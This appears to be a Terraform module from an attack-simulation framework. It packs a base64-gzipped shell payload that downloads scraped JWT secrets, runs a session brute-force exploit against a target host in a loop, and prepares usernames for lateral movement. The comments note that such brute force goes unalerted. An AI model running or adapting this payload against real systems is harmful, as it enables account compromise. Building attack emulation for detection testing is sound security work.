locals {
    exploit_script = "bruteforce_session.py"
    usernames_script = "generate_usernames.py"
    attack_dir = "/authapp_attack"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${base64gzip(local.exploit)} | base64 -d | gunzip > ${local.exploit_script}
    echo ${base64gzip(local.usernames)} | base64 -d | gunzip > ${local.usernames_script} 
    echo ${base64gzip(local.requirements)} | base64 -d | gunzip > requirements.txt
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
    log "installing exploit requirements..."
    python3.9 -m pip install --ignore-installed -r requirements.txt >> $LOGFILE 2>&1
    
    curl -LJ https://raw.githubusercontent.com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped-JWT-secrets.txt -o /tmp/scraped-JWT-secrets.txt

    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script..."
        log "checking target: ${local.target_ip}:${local.target_port}"
        while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
            log "failed check - waiting for target: ${local.target_ip}:${local.target_port}";
            sleep 30;
            if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                log "payload update detected - exiting loop and forcing payload download"
                rm -f /tmp/payload_$SCRIPTNAME
                break 2
            fi
        done;
        log "target available - sending payload";
        sleep 5;
        
        # brute force the session password
        python3.9 ${local.exploit_script} --host=${local.target_ip} --port=${local.target_port} --password-list=/tmp/scraped-JWT-secrets.txt --output-password-list=/tmp/hydra-passwords.txt 2>&1 | tee -a $LOGFILE

        # prep for second stage below providing usernames and password for lateral movement        

        # result is hydra-password list but we need a user list - since external brute force isn't alerted on let's skip
        # python3.9 ${local.usernames_script} --first=${var.inputs["compromised_user_first_name"]} --last=${var.inputs["compromised_user_last_name"]} --output=/tmp/hydra-users.txt
        USER_NAME="$(echo "${var.inputs["compromised_user_first_name"]}" | tr '[:upper:]' '[:lower:]' | cut -c1)$(echo "${var.inputs["compromised_user_last_name"]}"| tr '[:upper:]' '[:lower:]')"
        log "username: $USER_NAME"
        echo $USER_NAME > /tmp/hydra-users.txt

        log 'waiting 30 minutes...';
        sleep 1800
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT


    exploit         = file(
                                "${path.module}/resources/bruteforce_session.py", 
                            )
    requirements    = file(
                                "${path.module}/resources/requirements.txt", 
                            )
    usernames       = file(
                                "${path.module}/resources/generate_usernames.py", 
                            )

    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}

